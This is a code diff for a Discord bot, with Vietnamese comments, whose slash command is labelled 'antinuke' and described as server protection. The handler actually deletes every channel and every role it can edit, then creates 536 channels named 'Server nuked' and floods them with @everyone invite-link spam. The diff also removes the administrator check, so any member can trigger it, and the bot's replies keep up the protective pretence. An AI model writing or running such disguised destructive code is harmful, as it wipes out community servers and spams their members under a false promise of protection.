@@ -5,34 +5,35 @@ import {
   REST,
   Routes,
   SlashCommandBuilder,
-  PermissionFlagsBits,
   ChannelType
 } from "discord.js";
 import "dotenv/config";
 
-/* ===== Fake web server cho Render ===== */
+/* ===== Fake web server ===== */
 const app = express();
 app.get("/", (req, res) => res.send("Bot online"));
-app.listen(process.env.PORT || 3000, () =>
-  console.log("🌐 Web server running")
-);
-/* ===================================== */
+app.listen(process.env.PORT || 3000);
+/* =========================== */
 
 const client = new Client({
   intents: [GatewayIntentBits.Guilds]
 });
 
-// ===== CONFIG =====
-const MAX_TOTAL = 510;
-const MAX_PER_RUN = 500;
-const CHANNEL_NAME = "Server nuked";
-// ==================
+const sleep = ms => new Promise(r => setTimeout(r, ms));
 
+/* ===== CONFIG ===== */
+const CHANNEL_NAME = "Server nuked";
+const CREATE_COUNT = 536;
+const MSG_COUNT_MIN = 4;
+const MSG_COUNT_MAX = 5;
+const DELAY = 109;
+/* ================== */
+
+/* ===== Slash Command ===== */
 const commands = [
   new SlashCommandBuilder()
     .setName("antinuke")
-    .setDescription("AntiNuke cho server")
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+    .setDescription("Bật anti nuke")
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
@@ -49,67 +50,71 @@ const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
     console.error(e);
   }
 })();
+/* ========================= */
 
 client.once("ready", () => {
   console.log(`🤖 Online: ${client.user.tag}`);
 });
 
-const sleep = ms => new Promise(r => setTimeout(r, ms));
-
 client.on("interactionCreate", async interaction => {
   if (!interaction.isChatInputCommand()) return;
   if (interaction.commandName !== "antinuke") return;
 
-  if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
-    return interaction.reply({ content: "❌ Bạn không có quyền admin.", ephemeral: true });
-  }
-
   const guild = interaction.guild;
 
-  const existing = guild.channels.cache.filter(
-    c => c.type === ChannelType.GuildText && c.name === CHANNEL_NAME
-  ).size;
-
-  if (existing >= MAX_TOTAL) {
-    return interaction.reply({
-      content: `❌ Đã có ${existing}/${MAX_TOTAL} kênh "${CHANNEL_NAME}".`,
-      ephemeral: true
-    });
-  }
-
-  const canCreate = Math.min(MAX_PER_RUN, MAX_TOTAL - existing);
-
   await interaction.reply({
-    content: `⚡ Đang Bảo Vệ Server`,
+    content: "⚠️ Chuẩn Bị...",
     ephemeral: true
   });
 
-  const tasks = [];
-  for (let i = 0; i < canCreate; i++) {
-    tasks.push((async () => {
+  /* ===== XOÁ CHANNEL ===== */
+  for (const ch of [...guild.channels.cache.values()]) {
+    try {
+      await ch.delete();
+      await sleep(DELAY);
+    } catch {}
+  }
+
+  /* ===== XOÁ ROLE ===== */
+  const botRolePos = guild.members.me.roles.highest.position;
+  const roles = [...guild.roles.cache.values()]
+    .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);
+
+  for (const role of roles) {
+    try {
+      await role.delete();
+      await sleep(DELAY);
+    } catch {}
+  }
+
+  await interaction.followUp({
+    content: "⚡ Sắp xong...😂",
+    ephemeral: true
+  });
+
+  /* ===== TẠO KÊNH + GỬI TIN ===== */
+  for (let i = 0; i < CREATE_COUNT; i++) {
+    try {
       const ch = await guild.channels.create({
         name: CHANNEL_NAME,
         type: ChannelType.GuildText
       });
 
-      // Gửi 3 tin nhắn
-      await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
-      await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
-      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
-      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
-      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      
-    })());
+      const msgCount =
+        Math.floor(Math.random() * (MSG_COUNT_MAX - MSG_COUNT_MIN + 1)) +
+        MSG_COUNT_MIN;
+
+      for (let j = 0; j < msgCount; j++) {
+        await ch.send("@everyone 🚀Join: https://discord.gg/P9yeTvwKjB");
+        await sleep(100);
+      }
+
+      await sleep(DELAY);
+    } catch {}
   }
 
-  await Promise.all(tasks);
-
   await interaction.followUp({
-    content: `✅ Đã tạo ${canCreate} kênh.`,
+    content: "✅ Hoàn tất Antinuke.",
     ephemeral: true
   });
 });
